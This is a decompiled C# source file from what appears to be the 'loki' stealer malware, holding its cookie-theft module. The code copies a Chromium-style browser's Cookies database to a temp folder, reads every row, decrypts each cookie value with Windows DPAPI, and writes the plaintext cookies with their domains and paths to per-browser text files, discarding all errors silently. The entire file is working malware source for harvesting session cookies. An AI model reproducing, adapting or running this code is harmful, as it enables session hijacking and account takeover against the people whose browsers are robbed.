using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using mozila_passwords;

namespace loki.loki.Stealer.Cookies
{
	// Token: 0x02000033 RID: 51
	public static class GetCookies
	{
		// Token: 0x06000188 RID: 392 RVA: 0x0000B114 File Offset: 0x00009314
		public static string CreateTempPath()
		{
			return Path.Combine(new string[]
			{
				Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp", string.Format("tempDataBase{0}{1}{2}", DateTime.Now.ToString("O").Replace(':', '_'), Thread.CurrentThread.GetHashCode(), Thread.CurrentThread.ManagedThreadId))
			});
		}

		// Token: 0x06000189 RID: 393 RVA: 0x0000B188 File Offset: 0x00009388
		public static string CreateTempCopy(string filePath)
		{
			string text = GetCookies.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x0600018A RID: 394 RVA: 0x0000B1A4 File Offset: 0x000093A4
		public static void Cookie_Grab(string profilePath, string browser_name, string profile)
		{
			try
			{
				Sqlite sqlite = new Sqlite(GetCookies.CreateTempCopy(Path.Combine(profilePath, "Cookies")));
				sqlite.ReadTable("cookies");
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					GetCookies.CCookies++;
					try
					{
						GetCookies.Cookies.Add(string.Format("{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}{7}", new object[]
						{
							sqlite.GetValue(i, "host_key").Trim(),
							sqlite.GetValue(i, "httponly") == "1",
							sqlite.GetValue(i, "path").Trim(),
							sqlite.GetValue(i, "secure") == "1",
							sqlite.GetValue(i, "expires_utc").Trim(),
							sqlite.GetValue(i, "name").Trim(),
							GetCookies.DecryptBlob(sqlite.GetValue(i, "encrypted_value"), DataProtectionScope.CurrentUser, null).Trim(),
							Environment.NewLine
						}));
						GetCookies.domains.Add(sqlite.GetValue(i, "host_key").Trim());
					}
					catch (Exception)
					{
					}
				}
				using (StreamWriter streamWriter = new StreamWriter(string.Concat(new string[]
				{
					Program.dir,
					"\\Browsers\\",
					profile,
					"_",
					browser_name,
					"_Cookies.txt"
				})))
				{
					for (int j = 0; j < GetCookies.Cookies.Count<string>(); j++)
					{
						streamWriter.Write(GetCookies.Cookies[j]);
					}
				}
				GetCookies.Cookies.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x0600018B RID: 395 RVA: 0x0000B3A8 File Offset: 0x000095A8
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return GetCookies.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
		}

		// Token: 0x0600018C RID: 396 RVA: 0x0000B3BC File Offset: 0x000095BC
		public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			string result;
			try
			{
				result = ((EncryptedData != null && EncryptedData.Length != 0) ? Encoding.UTF8.GetString(ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope)) : string.Empty);
			}
			catch (CryptographicException)
			{
				result = string.Empty;
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x0400007F RID: 127
		public static int CCookies;

		// Token: 0x04000080 RID: 128
		private static readonly List<string> Cookies = new List<string>();

		// Token: 0x04000081 RID: 129
		public static List<string> domains = new List<string>();

		// Token: 0x04000082 RID: 130
		public static List<string> Cookies_Gecko = new List<string>();
	}
}
